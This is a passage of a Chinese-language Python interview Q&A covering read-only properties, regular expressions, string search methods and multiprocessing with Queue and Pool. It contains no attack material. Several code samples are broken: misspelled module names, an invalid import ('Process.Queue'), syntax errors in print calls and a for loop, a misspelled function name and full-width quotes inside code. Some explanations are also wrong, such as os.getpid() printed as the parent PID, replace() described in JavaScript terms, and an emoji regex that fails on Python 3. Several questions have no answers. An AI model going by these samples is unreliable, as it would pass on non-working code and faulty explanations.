92.\u9762\u5411\u5bf9\u8c61\u4e2d\u600e\u4e48\u5b9e\u73b0\u53ea\u8bfb\u5c5e\u6027?\n\n\u5c06\u5bf9\u8c61\u79c1\u6709\u5316\uff0c\u901a\u8fc7\u5171\u6709\u65b9\u6cd5\u63d0\u4f9b\u4e00\u4e2a\u8bfb\u53d6\u6570\u636e\u7684\u63a5\u53e3\n\n```python\nclass person:\n    def __init__(self, x):\n        self.__age = 10\n    def age(self):\n        return self.__age\nt = person(22)\n# t.__age =100\nprint(t.age())\n```\n\n\u6700\u597d\u7684\u65b9\u6cd5\n\n```python\nclass MyCls(object):\n    __weight = 50\n    \n    @property\n    def weight(self):\n        return self.__weight\n   \n```\n\n### 93.\u8c08\u8c08\u4f60\u5bf9\u9762\u5411\u5bf9\u8c61\u7684\u7406\u89e3\uff1f\n\n\u9762\u5411\u5bf9\u8c61\u662f\u76f8\u5f53\u4e8e\u9762\u5411\u8fc7\u7a0b\u800c\u8a00\u7684\uff0c\u9762\u5411\u8fc7\u7a0b\u8bed\u8a00\u662f\u4e00\u79cd\u57fa\u4e8e\u529f\u80fd\u5206\u6790\u7684\uff0c\u4ee5\u7b97\u6cd5\u4e3a\u4e2d\u5fc3\u7684\u7a0b\u5e8f\u8bbe\u8ba1\u65b9\u6cd5\uff0c\u800c\u9762\u5411\u5bf9\u8c61\u662f\u4e00\u79cd\u57fa\u4e8e\u7ed3\u6784\u5206\u6790\u7684\uff0c\u4ee5\u6570\u636e\u4e3a\u4e2d\u5fc3\u7684\u7a0b\u5e8f\u8bbe\u8ba1\u601d\u60f3\u3002\u5728\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u4e2d\u6709\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u4e1c\u897f\uff0c\u53eb\u505a\u7c7b\u3002\u9762\u5411\u5bf9\u8c61\u6709\u4e09\u5927\u7279\u6027\uff1a\u5c01\u88c5\u3001\u7ee7\u627f\u3001\u591a\u6001\u3002\n\n## \u6b63\u5219\u8868\u8fbe\u5f0f\n### 94.\u8bf7\u5199\u51fa\u4e00\u6bb5\u4ee3\u7801\u7528\u6b63\u5219\u5339\u914d\u51faip\uff1f\n\n### 95.a = \u201cabbbccc\u201d\uff0c\u7528\u6b63\u5219\u5339\u914d\u4e3aabccc,\u4e0d\u7ba1\u6709\u591a\u5c11b\uff0c\u5c31\u51fa\u73b0\u4e00\u6b21\uff1f\n    \u601d\u8def\uff1a\u4e0d\u7ba1\u6709\u591a\u5c11\u4e2ab\u66ff\u6362\u6210\u4e00\u4e2a\n\n    re.sub(r'b+', 'b', a)\n### 96.Python\u5b57\u7b26\u4e32\u67e5\u627e\u548c\u66ff\u6362\uff1f\n    a\u3001str.find()\uff1a\u6b63\u5e8f\u5b57\u7b26\u4e32\u67e5\u627e\u51fd\u6570\n    \u51fd\u6570\u539f\u578b\uff1a\n    str.find(substr [,pos_start [,pos_end ] ] )\n    \u8fd4\u56destr\u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684substr\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u7684\u6807\u53f7\uff0c\u5982\u679cstr\u4e2d\u6ca1\u6709substr\u5219\u8fd4\u56de-1\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ece\u5de6\u8fb9\u7b97\u8d77\u7684\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684substr\u7684\u9996\u5b57\u6bcd\u6807\u53f7\u3002\n\n    \u53c2\u6570\u8bf4\u660e\uff1a\n    str\uff1a\u4ee3\u8868\u539f\u5b57\u7b26\u4e32\n    substr\uff1a\u4ee3\u8868\u8981\u67e5\u627e\u7684\u5b57\u7b26\u4e32\n    pos_start\uff1a\u4ee3\u8868\u67e5\u627e\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u662f\u4ece\u4e0b\u68070\u5f00\u59cb\u67e5\u627e\n    pos_end\uff1a\u4ee3\u8868\u67e5\u627e\u7684\u7ed3\u675f\u4f4d\u7f6e\n\n    \u4f8b\u5b50\uff1a\n    'aabbcc.find('bb')' # 2\n\n    b\u3001str.index()\uff1a\u6b63\u5e8f\u5b57\u7b26\u4e32\u67e5\u627e\u51fd\u6570\n    index()\u51fd\u6570\u7c7b\u4f3c\u4e8efind()\u51fd\u6570\uff0c\u5728Python\u4e2d\u4e5f\u662f\u5728\u5b57\u7b26\u4e32\u4e2d\u67e5\u627e\u5b50\u4e32\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u8ddffind()\u4e0d\u540c\u7684\u662f\uff0c\u672a\u627e\u5230\u5219\u629b\u51fa\u5f02\u5e38\u3002\n\n    \u51fd\u6570\u539f\u578b\uff1a\n    str.index(substr [, pos_start, [ pos_end ] ] )\n\n    \u53c2\u6570\u8bf4\u660e\uff1a\n    str\uff1a\u4ee3\u8868\u539f\u5b57\u7b26\u4e32\n    substr\uff1a\u4ee3\u8868\u8981\u67e5\u627e\u7684\u5b57\u7b26\u4e32\n    pos_start\uff1a\u4ee3\u8868\u67e5\u627e\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u662f\u4ece\u4e0b\u68070\u5f00\u59cb\u67e5\u627e\n    pos_end\uff1a\u4ee3\u8868\u67e5\u627e\u7684\u7ed3\u675f\u4f4d\u7f6e\n\n    \u4f8b\u5b50\uff1a\n    'acdd l1 23'.index(' ') # 4\n\n    c\u3001str.rfind()\uff1a\u5012\u5e8f\u5b57\u7b26\u4e32\u67e5\u627e\u51fd\u6570\n\n    \u51fd\u6570\u539f\u578b\uff1a\n    str.rfind( substr [, pos_start [,pos_ end ] ])\n    \u8fd4\u56destr\u4e2d\u6700\u540e\u51fa\u73b0\u7684substr\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u7684\u6807\u53f7\uff0c\u5982\u679cstr\u4e2d\u6ca1\u6709substr\u5219\u8fd4\u56de-1\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ece\u53f3\u8fb9\u7b97\u8d77\u7684\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684substr\u7684\u9996\u5b57\u6bcd\u6807\u53f7\u3002\n\n    \u53c2\u6570\u8bf4\u660e\uff1a\n    str\uff1a\u4ee3\u8868\u539f\u5b57\u7b26\u4e32\n    substr\uff1a\u4ee3\u8868\u8981\u67e5\u627e\u7684\u5b57\u7b26\u4e32\n    pos_start\uff1a\u4ee3\u8868\u67e5\u627e\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u662f\u4ece\u4e0b\u68070\u5f00\u59cb\u67e5\u627e\n    pos_end\uff1a\u4ee3\u8868\u67e5\u627e\u7684\u7ed3\u675f\u4f4d\u7f6e\n\n    \u4f8b\u5b50\uff1a\n    'adsfddf'.rfind('d') # 5\n\n    d\u3001str.rindex()\uff1a\u5012\u5e8f\u5b57\u7b26\u4e32\u67e5\u627e\u51fd\u6570\n    rindex()\u51fd\u6570\u7c7b\u4f3c\u4e8erfind()\u51fd\u6570\uff0c\u5728Python\u4e2d\u4e5f\u662f\u5728\u5b57\u7b26\u4e32\u4e2d\u5012\u5e8f\u67e5\u627e\u5b50\u4e32\u6700\u540e\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u8ddfrfind()\u4e0d\u540c\u7684\u662f\uff0c\u672a\u627e\u5230\u5219\u629b\u51fa\u5f02\u5e38\u3002\n\n    \u51fd\u6570\u539f\u578b\uff1a\n    str.rindex(substr [, pos_start, [ pos_end ] ] )\n\n    \u53c2\u6570\u8bf4\u660e\uff1a\n    str\uff1a\u4ee3\u8868\u539f\u5b57\u7b26\u4e32\n    substr\uff1a\u4ee3\u8868\u8981\u67e5\u627e\u7684\u5b57\u7b26\u4e32\n    pos_start\uff1a\u4ee3\u8868\u67e5\u627e\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u662f\u4ece\u4e0b\u68070\u5f00\u59cb\u67e5\u627e\n    pos_end\uff1a\u4ee3\u8868\u67e5\u627e\u7684\u7ed3\u675f\u4f4d\u7f6e\n\n    \u4f8b\u5b50\uff1a\n     'adsfddf'.rindex('d') # 5\n\n    e\u3001\u4f7f\u7528re\u6a21\u5757\u8fdb\u884c\u67e5\u627e\u548c\u66ff\u6362\uff1a\n\u51fd\u6570 | \u8bf4\u660e\n---|---\nre.match(pat, s) | \u53ea\u4ece\u5b57\u7b26\u4e32s\u7684\u5934\u5f00\u59cb\u5339\u914d\uff0c\u6bd4\u5982(\u2018123\u2019, \u201812345\u2019)\u5339\u914d\u4e0a\u4e86\uff0c\u800c(\u2018123\u2019,\u201901234\u2019)\u5c31\u662f\u6ca1\u6709\u5339\u914d\u4e0a\uff0c\u6ca1\u6709\u5339\u914d\u4e0a\u8fd4\u56deNone\uff0c\u5339\u914d\u4e0a\u8fd4\u56dematchobject\nre.search(pat, s) | \u4ece\u5b57\u7b26\u4e32s\u7684\u4efb\u610f\u4f4d\u7f6e\u90fd\u8fdb\u884c\u5339\u914d\uff0c\u6bd4\u5982(\u2018123\u2019,\u201901234\u2019)\u5c31\u662f\u5339\u914d\u4e0a\u4e86\uff0c\u53ea\u8981s\u53ea\u80fd\u5b58\u5728\u7b26\u5408pat\u7684\u8fde\u7eed\u5b57\u7b26\u4e32\u5c31\u7b97\u5339\u914d\u4e0a\u4e86\uff0c\u6ca1\u6709\u5339\u914d\u4e0a\u8fd4\u56deNone\uff0c\u5339\u914d\u4e0a\u8fd4\u56dematchobject\nre.sub(pat,newpat,s) | re.sub(pat,newpat,s)\t\u5bf9\u5b57\u7b26\u4e32\u4e2ds\u7684\u5305\u542b\u7684\u6240\u6709\u7b26\u5408pat\u7684\u8fde\u7eed\u5b57\u7b26\u4e32\u8fdb\u884c\u66ff\u6362\uff0c\u5982\u679cnewpat\u4e3astr,\u90a3\u4e48\u5c31\u662f\u66ff\u6362\u4e3anewpat,\u5982\u679cnewpat\u662f\u51fd\u6570\uff0c\u90a3\u4e48\u5c31\u6309\u7167\u51fd\u6570\u8fd4\u56de\u503c\u66ff\u6362\u3002sub\u51fd\u6570\u4e24\u4e2a\u6709\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5206\u522b\u662fcount\u8868\u793a\u6700\u591a\u53ea\u5904\u7406\u524d\u51e0\u4e2a\u5339\u914d\u7684\u5b57\u7b26\u4e32\uff0c\u9ed8\u8ba4\u4e3a0\u8868\u793a\u5168\u90e8\u5904\u7406\uff1b\u6700\u540e\u4e00\u4e2a\u662fflags\uff0c\u9ed8\u8ba4\u4e3a0\n\n    f\u3001\u4f7f\u7528replace()\u8fdb\u884c\u66ff\u6362\uff1a\n    \u57fa\u672c\u7528\u6cd5\uff1a\u5bf9\u8c61.replace(rgExp,replaceText,max)\n\n    \u5176\u4e2d\uff0crgExp\u548creplaceText\u662f\u5fc5\u987b\u8981\u6709\u7684\uff0cmax\u662f\u53ef\u9009\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u4e0d\u52a0\u3002\n    rgExp\u662f\u6307\u6b63\u5219\u8868\u8fbe\u5f0f\u6a21\u5f0f\u6216\u53ef\u7528\u6807\u5fd7\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u8c61\uff0c\u4e5f\u53ef\u4ee5\u662f String \u5bf9\u8c61\u6216\u6587\u5b57\uff1b\n    replaceText\u662f\u4e00\u4e2aString \u5bf9\u8c61\u6216\u5b57\u7b26\u4e32\u6587\u5b57\uff1b\n    max\u662f\u4e00\u4e2a\u6570\u5b57\u3002\n    \u5bf9\u4e8e\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5728\u5bf9\u8c61\u7684\u6bcf\u4e2argExp\u90fd\u66ff\u6362\u6210replaceText\uff0c\u4ece\u5de6\u5230\u53f3\u6700\u591amax\u6b21\u3002\n\n    s1='hello world'\n    s1.replace('world','liming')\n\n### 97.\u7528Python\u5339\u914dHTML tag\u7684\u65f6\u5019\uff0c<.*> \u548c <.*?> \u6709\u4ec0\u4e48\u533a\u522b\n    \u7b2c\u4e00\u4e2a\u4ee3\u8868\u8d2a\u5fc3\u5339\u914d\uff0c\u7b2c\u4e8c\u4e2a\u4ee3\u8868\u975e\u8d2a\u5fc3\uff1b\n    ?\u5728\u4e00\u822c\u6b63\u5219\u8868\u8fbe\u5f0f\u91cc\u7684\u8bed\u6cd5\u662f\u6307\u7684\"\u96f6\u6b21\u6216\u4e00\u6b21\u5339\u914d\u5de6\u8fb9\u7684\u5b57\u7b26\u6216\u8868\u8fbe\u5f0f\"\u76f8\u5f53\u4e8e{0,1}\n    \u800c\u5f53?\u540e\u7f00\u4e8e*,+,?,{n},{n,},{n,m}\u4e4b\u540e\uff0c\u5219\u4ee3\u8868\u975e\u8d2a\u5fc3\u5339\u914d\u6a21\u5f0f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5c3d\u53ef\u80fd\u5c11\u7684\u5339\u914d\u5de6\u8fb9\u7684\u5b57\u7b26\u6216\u8868\u8fbe\u5f0f\uff0c\u8fd9\u91cc\u662f\u5c3d\u53ef\u80fd\u5c11\u7684\u5339\u914d.(\u4efb\u610f\u5b57\u7b26)\n\n    \u6240\u4ee5\uff1a\u7b2c\u4e00\u79cd\u5199\u6cd5\u662f\uff0c\u5c3d\u53ef\u80fd\u591a\u7684\u5339\u914d\uff0c\u5c31\u662f\u5339\u914d\u5230\u7684\u5b57\u7b26\u4e32\u5c3d\u91cf\u957f\uff0c\u7b2c\u4e8c\u4e2d\u5199\u6cd5\u662f\u5c3d\u53ef\u80fd\u5c11\u7684\u5339\u914d\uff0c\u5c31\u662f\u5339\u914d\u5230\u7684\u5b57\u7b26\u4e32\u5c3d\u91cf\u77ed\u3002\n    \u6bd4\u5982<tag>tag>tag>end\uff0c\u7b2c\u4e00\u4e2a\u4f1a\u5339\u914d<tag>tag>tag>,\u7b2c\u4e8c\u4e2a\u4f1a\u5339\u914d<tag>\u3002\n### 98.\u6b63\u5219\u8868\u8fbe\u5f0f\u8d2a\u5a6a\u4e0e\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u533a\u522b\uff1f\n    \u8d2a\u5a6a\u6a21\u5f0f\uff1a\n    \u5b9a\u4e49\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f\u53bb\u5339\u914d\u65f6\uff0c\u4f1a\u5c3d\u91cf\u591a\u7684\u5339\u914d\u7b26\u5408\u6761\u4ef6\u7684\u5185\u5bb9\n    \u6807\u8bc6\u7b26\uff1a+\uff0c?\uff0c*\uff0c{n}\uff0c{n,}\uff0c{n,m}\n    \u5339\u914d\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e0a\u8ff0\u6807\u8bc6\u7b26\uff0c\u4ee3\u8868\u662f\u8d2a\u5a6a\u5339\u914d\uff0c\u4f1a\u5c3d\u53ef\u80fd\u591a\u7684\u53bb\u5339\u914d\u5185\u5bb9\n\n    \u975e\u8d2a\u5a6a\u6a21\u5f0f\uff1a\n    \u5b9a\u4e49\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f\u53bb\u5339\u914d\u65f6\uff0c\u4f1a\u5c3d\u91cf\u5c11\u7684\u5339\u914d\u7b26\u5408\u6761\u4ef6\u7684\u5185\u5bb9 \u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u65e6\u53d1\u73b0\u5339\u914d\u7b26\u5408\u8981\u6c42\uff0c\u7acb\u9a6c\u5c31\u5339\u914d\u6210\u529f\uff0c\u800c\u4e0d\u4f1a\u7ee7\u7eed\u5339\u914d\u4e0b\u53bb(\u9664\u975e\u6709g\uff0c\u5f00\u542f\u4e0b\u4e00\u7ec4\u5339\u914d)\n    \u6807\u8bc6\u7b26\uff1a+?\uff0c??\uff0c*?\uff0c{n}?\uff0c{n,}?\uff0c{n,m}?\n    \u53ef\u4ee5\u770b\u5230\uff0c\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u6807\u8bc6\u7b26\u5f88\u6709\u89c4\u5f8b\uff0c\u5c31\u662f\u8d2a\u5a6a\u6a21\u5f0f\u7684\u6807\u8bc6\u7b26\u540e\u9762\u52a0\u4e0a\u4e00\u4e2a?\n\n    \u53c2\u8003\u6587\u7ae0\uff1ahttps:\/\/dailc.github.io\/2017\/07\/06\/regularExpressionGreedyAndLazy.html\n\n### 99.\u5199\u51fa\u5f00\u5934\u5339\u914d\u5b57\u6bcd\u548c\u4e0b\u5212\u7ebf\uff0c\u672b\u5c3e\u662f\u6570\u5b57\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff1f\n    s1='_aai0efe00'\n    res=re.findall('^[a-zA-Z_]?[a-zA-Z0-9_]{1,}\\d$',s1)\n    print(res)\n\n### 100.\u6b63\u5219\u8868\u8fbe\u5f0f\u64cd\u4f5c\n### 101.\u8bf7\u5339\u914d\u51fa\u53d8\u91cfA \u4e2d\u7684json\u5b57\u7b26\u4e32\u3002\n### 102.\u600e\u4e48\u8fc7\u6ee4\u8bc4\u8bba\u4e2d\u7684\u8868\u60c5\uff1f\n    \u601d\u8def\uff1a\u4e3b\u8981\u662f\u5339\u914d\u8868\u60c5\u5305\u7684\u8303\u56f4\uff0c\u5c06\u8868\u60c5\u5305\u7684\u8303\u56f4\u7528\u7a7a\u66ff\u6362\u6389\n```\nimport re\npattern = re.compile(u'[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]')\npattern.sub('',text)\n\n```\n### 103.\u7b80\u8ff0Python\u91cc\u9762search\u548cmatch\u7684\u533a\u522b\n    match()\u51fd\u6570\u53ea\u68c0\u6d4b\u5b57\u7b26\u4e32\u5f00\u5934\u4f4d\u7f6e\u662f\u5426\u5339\u914d\uff0c\u5339\u914d\u6210\u529f\u624d\u4f1a\u8fd4\u56de\u7ed3\u679c\uff0c\u5426\u5219\u8fd4\u56deNone\uff1b\n    search()\u51fd\u6570\u4f1a\u5728\u6574\u4e2a\u5b57\u7b26\u4e32\u5185\u67e5\u627e\u6a21\u5f0f\u5339\u914d,\u53ea\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u5339\u914d\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u5339\u914d\u4fe1\u606f\u7684\u5bf9\u8c61,\u8be5\u5bf9\u8c61\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528group()\u65b9\u6cd5\u5f97\u5230\u5339\u914d\u7684\u5b57\u7b26\u4e32,\u5982\u679c\u5b57\u7b26\u4e32\u6ca1\u6709\u5339\u914d\uff0c\u5219\u8fd4\u56deNone\u3002\n\n### 104.\u8bf7\u5199\u51fa\u5339\u914dip\u7684Python\u6b63\u5219\u8868\u8fbe\u5f0f\n### 105.Python\u91ccmatch\u4e0esearch\u7684\u533a\u522b\uff1f\n    \u89c1103\u9898\n\n## \u7cfb\u7edf\u7f16\u7a0b\n### 106.\u8fdb\u7a0b\u603b\u7ed3\n\u8fdb\u7a0b\uff1a\u7a0b\u5e8f\u8fd0\u884c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u5c31\u79f0\u4e4b\u4e3a\u8fdb\u7a0b\u3002\u8fdb\u7a0b\u9700\u8981\u76f8\u5e94\u7684\u7cfb\u7edf\u8d44\u6e90\uff1a\u5185\u5b58\u3001\u65f6\u95f4\u7247\u3001pid\u3002\n\u521b\u5efa\u8fdb\u7a0b\uff1a\n\u9996\u5148\u8981\u5bfc\u5165multiprocessing\u4e2d\u7684Process\uff1a\n\u521b\u5efa\u4e00\u4e2aProcess\u5bf9\u8c61;\n\u521b\u5efaProcess\u5bf9\u8c61\u65f6\uff0c\u53ef\u4ee5\u4f20\u9012\u53c2\u6570;\n```python\np = Process(target=XXX,args=(tuple,),kwargs={key:value})\ntarget = XXX \u6307\u5b9a\u7684\u4efb\u52a1\u51fd\u6570\uff0c\u4e0d\u7528\u52a0(),\nargs=(tuple,)kwargs={key:value}\u7ed9\u4efb\u52a1\u51fd\u6570\u4f20\u9012\u7684\u53c2\u6570\n```\n\u4f7f\u7528start()\u542f\u52a8\u8fdb\u7a0b\n\u7ed3\u675f\u8fdb\u7a0b\n\u7ed9\u5b50\u8fdb\u7a0b\u6307\u5b9a\u51fd\u6570\u4f20\u9012\u53c2\u6570Demo\n```python\nimport os\nfrom mulitprocessing import Process\nimport time\n\ndef pro_func(name,age,**kwargs):\n    for i in range(5):\n        print(\"\u5b50\u8fdb\u7a0b\u6b63\u5728\u8fd0\u884c\u4e2d\uff0cname=%s,age=%d,pid=%d\"%(name,age,os.getpid()))\n        print(kwargs)\n        time.sleep(0.2)\nif __name__ ==\"__main__\":\n    #\u521b\u5efaProcess\u5bf9\u8c61\n    p = Process(target=pro_func,args=('\u5c0f\u660e',18),kwargs={'m':20})\n    #\u542f\u52a8\u8fdb\u7a0b\n    p.start()\n    time.sleep(1)\n    #1\u79d2\u949f\u4e4b\u540e\uff0c\u7acb\u523b\u7ed3\u675f\u5b50\u8fdb\u7a0b\n    p.terminate()\n    p.join()\n```\n\u6ce8\u610f\uff1a\u8fdb\u7a0b\u95f4\u4e0d\u5171\u4eab\u5168\u5c40\u53d8\u91cf\n\n\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1-Queue\n\n\u5728\u521d\u59cb\u5316Queue()\u5bf9\u8c61\u65f6\uff08\u4f8b\u5982q=Queue(),\u82e5\u5728\u62ec\u53f7\u4e2d\u6ca1\u6709\u6307\u5b9a\u6700\u5927\u53ef\u63a5\u53d7\u7684\u6d88\u606f\u6570\u91cf\uff0c\u83b7\u6570\u91cf\u4e3a\u8d1f\u503c\u65f6\uff0c\u90a3\u4e48\u5c31\u4ee3\u8868\u53ef\u63a5\u53d7\u7684\u6d88\u606f\u6570\u91cf\u6ca1\u6709\u4e0a\u9650\u4e00\u76f4\u5230\u5185\u5b58\u5c3d\u5934\uff09\n\nQueue.qsize():\u8fd4\u56de\u5f53\u524d\u961f\u5217\u5305\u542b\u7684\u6d88\u606f\u6570\u91cf\n\nQueue.empty():\u5982\u679c\u961f\u5217\u4e3a\u7a7a\uff0c\u8fd4\u56deTrue\uff0c\u53cd\u4e4bFalse\n\nQueue.full():\u5982\u679c\u961f\u5217\u6ee1\u4e86\uff0c\u8fd4\u56deTrue,\u53cd\u4e4bFalse\n\nQueue.get([block[,timeout]]):\u83b7\u53d6\u961f\u5217\u4e2d\u7684\u4e00\u6761\u6d88\u606f\uff0c\u7136\u540e\u5c06\u5176\u4ece\u961f\u5217\u4e2d\u79fb\u9664\uff0c\n\nblock\u9ed8\u8ba4\u503c\u4e3aTrue\u3002\n\n\u5982\u679cblock\u4f7f\u7528\u9ed8\u8ba4\u503c\uff0c\u4e14\u6ca1\u6709\u8bbe\u7f6etimeout\uff08\u5355\u4f4d\u79d2),\u6d88\u606f\u961f\u5217\u5982\u679c\u4e3a\u7a7a\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5c06\u88ab\u963b\u585e\uff08\u505c\u5728\u8bfb\u4e2d\u72b6\u6001\uff09\uff0c\u76f4\u5230\u6d88\u606f\u961f\u5217\u8bfb\u5230\u6d88\u606f\u4e3a\u6b62\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86timeout\uff0c\u5219\u4f1a\u7b49\u5f85timeout\u79d2\uff0c\u82e5\u8fd8\u6ca1\u8bfb\u53d6\u5230\u4efb\u4f55\u6d88\u606f\uff0c\u5219\u629b\u51fa\u201cQueue.Empty\"\u5f02\u5e38\uff1a\n\nQueue.get_nowait()\u76f8\u5f53\u4e8eQueue.get(False)\n\nQueue.put(item,[block[,timeout]]):\u5c06item\u6d88\u606f\u5199\u5165\u961f\u5217\uff0cblock\u9ed8\u8ba4\u503c\u4e3aTrue;\n\u5982\u679cblock\u4f7f\u7528\u9ed8\u8ba4\u503c\uff0c\u4e14\u6ca1\u6709\u8bbe\u7f6etimeout\uff08\u5355\u4f4d\u79d2\uff09\uff0c\u6d88\u606f\u961f\u5217\u5982\u679c\u5df2\u7ecf\u6ca1\u6709\u7a7a\u95f4\u53ef\u5199\u5165\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5c06\u88ab\u963b\u585e\uff08\u505c\u5728\u5199\u5165\u72b6\u6001\uff09\uff0c\u76f4\u5230\u4ece\u6d88\u606f\u961f\u5217\u817e\u51fa\u7a7a\u95f4\u4e3a\u6b62\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86timeout\uff0c\u5219\u4f1a\u7b49\u5f85timeout\u79d2\uff0c\u82e5\u8fd8\u6ca1\u7a7a\u95f4\uff0c\u5219\u629b\u51fa\u201dQueue.Full\"\u5f02\u5e38\n\u5982\u679cblock\u503c\u4e3aFalse\uff0c\u6d88\u606f\u961f\u5217\u5982\u679c\u6ca1\u6709\u7a7a\u95f4\u53ef\u5199\u5165\uff0c\u5219\u4f1a\u7acb\u523b\u629b\u51fa\"Queue.Full\"\u5f02\u5e38;\nQueue.put_nowait(item):\u76f8\u5f53Queue.put(item,False)\n\n\u8fdb\u7a0b\u95f4\u901a\u4fe1Demo:\n```python\nfrom multiprocessing import Process.Queue\nimport os,time,random\n#\u5199\u6570\u636e\u8fdb\u7a0b\u6267\u884c\u7684\u4ee3\u7801\uff1a\ndef write(q):\n    for value in ['A','B','C']:\n        print(\"Put %s to queue...\",%value)\n        q.put(value)\n        time.sleep(random.random())\n#\u8bfb\u6570\u636e\u8fdb\u7a0b\u6267\u884c\u7684\u4ee3\u7801\ndef read(q):\n    while True:\n        if not q.empty():\n            value = q.get(True)\n            print(\"Get %s from queue.\",%value)\n            time.sleep(random.random())\n        else:\n            break\nif __name__=='__main__':\n    #\u7236\u8fdb\u7a0b\u521b\u5efaQueue\uff0c\u5e76\u4f20\u7ed9\u5404\u4e2a\u5b50\u8fdb\u7a0b\n    q = Queue()\n    pw = Process(target=write,args=(q,))\n    pr = Process(target=read,args=(q,))\n    #\u542f\u52a8\u5b50\u8fdb\u7a0bpw \uff0c\u5199\u5165\uff1a\n    pw.start()\n    #\u7b49\u5f85pw\u7ed3\u675f\n    pw.join()\n    #\u542f\u52a8\u5b50\u8fdb\u7a0bpr\uff0c\u8bfb\u53d6\uff1a\n    pr.start()\n    pr.join()\n    #pr \u8fdb\u7a0b\u91cc\u662f\u6b7b\u5faa\u73af\uff0c\u65e0\u6cd5\u7b49\u5f85\u5176\u7ed3\u675f\uff0c\u53ea\u80fd\u5f3a\u884c\u7ec8\u6b62:\n    print('')\n    print('\u6240\u6709\u6570\u636e\u90fd\u5199\u5165\u5e76\u4e14\u8bfb\u5b8c')\n```\n    \u8fdb\u7a0b\u6c60Pool\n```python\n#coding:utf-8\nfrom multiprocessing import Pool\nimport os,time,random\n\ndef worker(msg):\n    t_start = time.time()\n    print(\"%s \u5f00\u59cb\u6267\u884c\uff0c\u8fdb\u7a0b\u53f7\u4e3a%d\"%(msg,os.getpid()))\n    # random.random()\u968f\u673a\u751f\u62100-1\u4e4b\u95f4\u7684\u6d6e\u70b9\u6570\n    time.sleep(random.random()*2)\n    t_stop = time.time()\n    print(msg,\"\u6267\u884c\u5b8c\u6bd5\uff0c\u8017\u65f6%0.2f\u201d%\uff08t_stop-t_start))\n\npo = Pool(3)#\u5b9a\u4e49\u4e00\u4e2a\u8fdb\u7a0b\u6c60\uff0c\u6700\u5927\u8fdb\u7a0b\u65703\nfor i in range(0,10):\n    po.apply_async(worker,(i,))\nprint(\"---start----\")\npo.close()\npo.join()\nprint(\"----end----\")\n```\n\u8fdb\u7a0b\u6c60\u4e2d\u4f7f\u7528Queue\n\n\u5982\u679c\u8981\u4f7f\u7528Pool\u521b\u5efa\u8fdb\u7a0b\uff0c\u5c31\u9700\u8981\u4f7f\u7528multiprocessing.Manager()\u4e2d\u7684Queue(),\u800c\u4e0d\u662fmultiprocessing.Queue(),\u5426\u5219\u4f1a\u5f97\u5230\u5982\u4e0b\u7684\u9519\u8bef\u4fe1\u606f\uff1a\n\nRuntimeError\uff1a Queue objects should only be shared between processs through inheritance\n```python\nfrom multiprocessing import Manager,Pool\nimport os,time,random\ndef reader(q):\n    print(\"reader \u542f\u52a8(%s),\u7236\u8fdb\u7a0b\u4e3a\uff08%s)\"%(os.getpid(),os.getpid()))\n    for i in range(q.qsize()):\n        print(\"reader \u4eceQueue\u83b7\u53d6\u5230\u6d88\u606f:%s\"%q.get(True))\n\ndef writer(q):\n    print(\"writer \u542f\u52a8\uff08%s),\u7236\u8fdb\u7a0b\u4e3a(%s)\"%(os.getpid(),os.getpid()))\n    for i ini \"itcast\":\n        q.put(i)\nif __name__ == \"__main__\":\n    print(\"(%s)start\"%os.getpid())\n    q = Manager().Queue()#\u4f7f\u7528Manager\u4e2d\u7684Queue\n    po = Pool()\n    po.apply_async(wrtier,(q,))\n    time.sleep(1)\n    po.apply_async(reader,(q,))\n    po.close()\n    po.join()\n    print(\"(%s)End\"%os.getpid())\n```\n### 